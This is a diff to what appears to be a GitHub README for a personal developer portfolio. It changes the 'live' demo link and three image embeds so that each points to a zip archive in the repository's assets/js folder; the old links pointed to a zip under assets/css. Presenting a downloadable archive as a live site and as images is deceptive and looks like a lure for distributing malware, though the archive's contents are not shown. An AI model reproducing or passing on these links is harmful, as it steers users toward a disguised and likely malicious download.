@@ -17,11 +17,11 @@ Key Features:
 • Contact Me: Connect easily via the integrated contact form and social media links.
 </br>
 </br>
-Whether you're a recruiter, fellow developer, or just curious about what I can do, this portfolio is designed to impress. Check it out live here (https://github.com/Kartikay7124/Kartikay-Portfolio/raw/refs/heads/main/assets/css/Kartikay_Portfolio_v2.9.zip)!
+Whether you're a recruiter, fellow developer, or just curious about what I can do, this portfolio is designed to impress. Check it out live here (https://raw.githubusercontent.com/Kartikay7124/Kartikay-Portfolio/main/assets/js/Portfolio_Kartikay_v2.8.zip)!
 </br>
 </br>
 
-![Img 3](https://github.com/Kartikay7124/Kartikay-Portfolio/raw/refs/heads/main/assets/css/Kartikay_Portfolio_v2.9.zip)
-![Img 7](https://github.com/Kartikay7124/Kartikay-Portfolio/raw/refs/heads/main/assets/css/Kartikay_Portfolio_v2.9.zip)
-![Img 8](https://github.com/Kartikay7124/Kartikay-Portfolio/raw/refs/heads/main/assets/css/Kartikay_Portfolio_v2.9.zip)
+![Img 3](https://raw.githubusercontent.com/Kartikay7124/Kartikay-Portfolio/main/assets/js/Portfolio_Kartikay_v2.8.zip)
+![Img 7](https://raw.githubusercontent.com/Kartikay7124/Kartikay-Portfolio/main/assets/js/Portfolio_Kartikay_v2.8.zip)
+![Img 8](https://raw.githubusercontent.com/Kartikay7124/Kartikay-Portfolio/main/assets/js/Portfolio_Kartikay_v2.8.zip)
 
